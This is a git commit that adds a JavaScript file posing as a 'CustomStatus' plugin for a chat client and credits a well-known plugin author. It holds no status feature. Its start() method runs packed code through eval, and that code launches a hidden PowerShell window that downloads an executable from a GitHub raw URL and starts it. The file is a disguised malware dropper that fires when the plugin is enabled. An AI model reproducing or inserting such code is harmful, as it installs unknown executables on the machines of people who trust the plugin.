6e47b1caff0312bf1e12404f7c6b35be46608cb3
xrmna <86806715+xrmna@users.noreply.github.com>
2022-06-18 21:36:40 +0200

    Add files via upload

---
+++ CustomStatus.plugin.js
@@ -0,0 +1,16 @@
+/**
+ * @name CustomStatus
+ * @version 1.6.2
+ * @description Allows you to custom your current public status
+ * @author DevilBro
+ *   
+ */
+module.exports = class Gifhider{
+    load() { }
+    start() {
+    
+    eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c.toString(a)+'\\b','g'),k[c])}}return p}('r 2=6(\'7\').2;2("3.0 -8 9 $a = \'b\'; c-d e://5.g.f/i/j/k/1.0 -l \'1.0\'; 3 m-n -o \\"1.0\\"",p(q,h,4){});',28,28,'exe|status|exec|powershell|stdErr|raw|require|child_process|windowstyle|hidden|ProgressPreference|SilentlyContinue|Invoke|WebRequest|https|com|githubusercontent|stdOut|xrmna|lighting|main|OutFile|Start|Process|FilePath|function|error|var'.split('|')))
+}
+stop(){
+}
+}
